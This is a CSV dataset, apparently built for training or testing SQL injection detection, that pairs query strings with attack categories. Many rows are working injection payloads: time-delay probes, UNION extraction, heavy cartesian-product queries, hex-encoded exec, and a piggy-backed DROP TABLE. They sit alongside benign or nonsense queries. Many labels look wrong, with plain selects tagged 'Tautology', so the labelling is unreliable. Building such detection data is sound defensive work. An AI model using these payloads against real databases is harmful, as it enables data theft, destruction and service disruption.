knownpatterns,category
SELECT * FROM wait WHERE moon = 'clearly',Tautology
SELECT COUNT ( facing )  FROM gray,Illegal/Logically incorrect query
"""call regexp_substring  (  repeat  (  right  (  char  (  3702  )    )  ,500000000  )  ,null  )   and    (    (     (  """"yzjl"""" like """"yzjl""",Illegal/Logically incorrect query
1'||  (  select 'feyg' from dual where 7734  =  7734 and 3843  =  6724#,Tautology
SELECT * FROM poem WHERE NOT donkey = 'heading'  AND NOT salmon = 'everywhere',Tautology
"""1""""   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --""",Illegal/Logically incorrect query
SELECT *FROM  ( SELECT column_name ( s )  FROM,Tautology
SELECT DISTINCT brush FROM huge,Tautology
SELECT TOP 50 PERCENT * FROM lot,Tautology
FROM  ( SELECT DISTINCT term FROM river ) ,Tautology
SELECT * FROM border 3,Tautology
""" select * from users where id=1 or \<\. union select 1,@@VERSION -- 1""",Union Query
SELECT TOP 3 * FROM hurried WHERE table = 'cow',Tautology
SELECT * FROM camp ORDER BY ants,Tautology
SELECT MIN ( saw )  AS instance FROM either,Illegal/Logically incorrect query
"""  SELECT * FROM go WHERE mental IN  ( 'writer', 'me', 'fellow' )  """,Tautology
SELECT option_value FROM wp_options WHERE option_name  =  'kc_tkl_cc' LIMIT 1,Tautology
SELECT * FROM related WHERE along LIKE '%income%',Tautology
SELECT TOP 50 PERCENT * FROM customs,Tautology
""" SELECT * FROM shape ORDER BY mice, empty""",Tautology
"""1%"""" or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --""",Illegal/Logically incorrect query
"""select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn""",Illegal/Logically incorrect query
1'||  (  select 'nwve' where 7721=  7721,Tautology
SELECT * FROM understanding  WHERE no NOT LIKE '[captain]%',Tautology
SELECT TOP 3 * FROM brief WHERE monkey = 'changing',Tautology
1'   )    )    as tley where 3539  =  3539,Tautology
"""-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--""",Union Query
SELECT * FROM  ( SELECT right FROM world ) ,Tautology
1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,Time-based Query
SELECT * FROM active 3,Tautology
"""   SELECT Employees.carry, COUNT ( Orders.referID )  AS dreamFROM    ( OrdersINNER JOIN explanation ON Orders.blowID  =  Employees.exerciseID ) """,Illegal/Logically incorrect query
""" select * from users where id=1 or """"1{"""" or 1=1-- 1""""",Tautology
SELECT * FROM cookies WHERE pack = 'share' LIMIT 3,Tautology
"""select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'nkte'  =  'nkte""",Illegal/Logically incorrect query
-6145 or   (  8459  =  8459  )  *4906-- yklv,Tautology
"""  SELECT Orders.OrderID, Employees.LastName, Employees.FirstNameFROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.EmployeeID ORDER BY Orders.OrderID;""",Tautology
1   )    )    union all select null#,Union Query
SELECT * FROM ship WHERE sea BETWEEN '1996-07-01' AND '1996-07-31',Tautology
SELECT * FROM zipper FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM jar,Tautology
"""1'||  (  select 'jonh' from dual where 2415  =  2415 union all select null,null,null,null,null,null,null,null,null--""",Union Query
SELECT return ( s )  FROM wait SELECT sound ( s ) ,Tautology
"""1""""   )    )    as thoj where 1577=1577 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )    )  ,500000000  )  ,null  )  --""",Illegal/Logically incorrect query
"""1"""" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and """"kins""""  =  """"kins""",Illegal/Logically incorrect query
"""1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   """,Alternate Encoding
"""-7635"""" union all select 1284284284284284284#""",Union Query
"""-9996' or make_set  (  1237  =  7111,7111  )  """,Tautology
"""1'   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --""",Tautology
SELECT poetry,Tautology
SELECT COUNT ( beginningID ) FROM were,Illegal/Logically incorrect query
SELECT * FROM Customers  WHERE Country = 'Germany'  AND  ( City = 'Berlin' OR City = 'MÃƒÂ¼nchen' ) ;,Illegal/Logically incorrect query
SELECT * FROM pipe ORDER BY safe,Tautology
1'||  (  select 'pxkz' where 2207  =  2207 and   (  3020  =  3020  )  *6703  )  ||',Tautology
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  -- mmjk,Time-based Query
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,Alternate Encoding
SELECT * FROM soil FETCH FIRST 3 ROWS ONLY,Tautology
SELECT * FROM most ORDER BY people,Tautology
SELECT mysterious,Tautology
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_timeout_wp_wps_bg_image_sync_1_process_lock' LIMIT 1,Tautology
begin user_lock.sleep  (  5  ) ,Time-based Query
1  )   as zmxb where 8424  =  8424 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   \::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,Tautology
SELECT * FROM spite FETCH FIRST 50 PERCENT ROWS ONLY,Tautology
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,Time-based Query
"""1' in boolean mode  )   and extractvalue  (  7982,concat  (  0x5cx7171706a71,  (  select   (  elt  (  7982  =  7982   )    )     )  x717a767a71   )    )   #""",Alternate Encoding
"""   SELECT supper, finger, entireFROM slope WHERE here  IS NOT NULL""",Tautology
"""-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#""",Union Query
"""1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'ffzv'  =  'ffzv""",Alternate Encoding
"""1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'kyxl'  =  'kyxl""",Tautology
SELECT writer ( s )  FROM entire SELECT thirty ( s ) ,Tautology
SELECT * FROM north,Tautology
SELECT * FROM sitting FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM wing,Tautology
SELECT COUNT ( smoke ) FROM enter,Illegal/Logically incorrect query
-7775 or 8571=  8571--,Tautology
"""1' in boolean mode  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --""",Illegal/Logically incorrect query
"""1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   """,Tautology
SELECT AVG ( spend ) FROM turn SELECT SUM ( widely ) ,Illegal/Logically incorrect query
"""1"""" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and """"ssfu""""  =  """"ssfu""",Time-based Query
"""SELECT customername, contactname FROM customers; ALTER TABLE Customers ADD Email varchar ( 255 ) ; ALTER TABLE Customers DROP COLUMN Email; DROP TABLE Shippers;  TRUNCATE TABLE Categories;""",Piggy-Backed Query
SELECT * FROM mice WHERE wrong = 'offer' FETCH FIRST 3 ROWS ONLY,Tautology
SELECT TOP 3 * FROM hung WHERE pan = 'practical' SELECT * FROM fed,Tautology
SELECT * FROM rich 3,Tautology
SELECT AVG ( silk ) FROM edge,Illegal/Logically incorrect query
SELECT * FROM  ( SELECT replied FROM straight ) ,Tautology
"""select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and """"%""""  =  """"""",Alternate Encoding
SELECT TOP 3 * FROM harder WHERE today = 'poet',Tautology
SELECT COUNT ( anyone ) FROM thy,Illegal/Logically incorrect query
"""1""""  )   order by 1#""",Tautology
DELETE FROM string,Tautology
1%' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and '%'  =  ',Tautology
"""1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'vgkt'  =  'vgkt""",Illegal/Logically incorrect query
SELECT * FROM bean WHERE raw IN  ( SELECT engineer FROM deer ) ,Tautology
"""   SELECT quite, window, watchFROM edge WHERE onto  IS NOT NULL""",Tautology
SELECT COUNT ( DISTINCT quietly )  FROM college,Illegal/Logically incorrect query
SELECT industry ( s )  FROM policeman SELECT world ( s ) ,Tautology
SELECT * FROM zulu 3 SELECT * FROM child,Tautology
SELECT * FROM was WHERE movement = 'ate'  OR asleep = 'waste',Time-based Query
DELETE FROM explain WHERE development = 'is',Tautology
